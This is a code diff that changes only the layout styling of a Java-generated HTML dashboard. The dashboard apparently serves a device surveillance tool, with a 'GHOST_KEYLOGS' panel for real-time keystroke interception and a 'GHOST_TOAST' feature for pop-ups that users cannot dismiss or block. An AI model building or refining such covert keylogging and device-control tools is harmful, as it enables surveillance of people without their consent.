@@ -484,7 +484,7 @@ public class GhostModule extends BaseModule {
 
         // Unified Interaction Suite (Vertical Stacked Cards)
         // --- COMBINED CARD: GHOST_CONTROL & GHOST_INSPECTOR (SIDE-BY-SIDE) ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan); margin-top: 25px;\">");
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-cyan);\">");
         html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 30px; align-items: start; width: 100%;\">\n" +
                     "  <style>\n" +
                     "    @media (max-width: 1024px) {\n" +
@@ -562,7 +562,7 @@ public class GhostModule extends BaseModule {
         html.append("</div>"); // Close combined card
 
         // --- GHOST TOAST CARD ---
-        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 50px;\">");
+        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow);\">");
         html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
         
         html.append("<style>");
@@ -634,18 +634,16 @@ public class GhostModule extends BaseModule {
         html.append("</div>"); // Close GHOST_TOAST card
 
         // Ghost Keylogs Section
-        html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
+        html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"display: block !important;\">");
         html.append("<div class=\"flex-header\">");
         html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
         html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
         html.append("</div>");
         
-        html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:300px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1);\">");
+        html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:480px; min-height:450px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1); margin-top: 15px;\">");
         html.append("[WAITING_FOR_UPLINK] Monitoring focused app input...");
         html.append("</div>");
         html.append("</div>");
-        
-        html.append("<div style=\"height: 50px;\"></div>");
 
         html.append("</div>");
         html.append(getFooter());
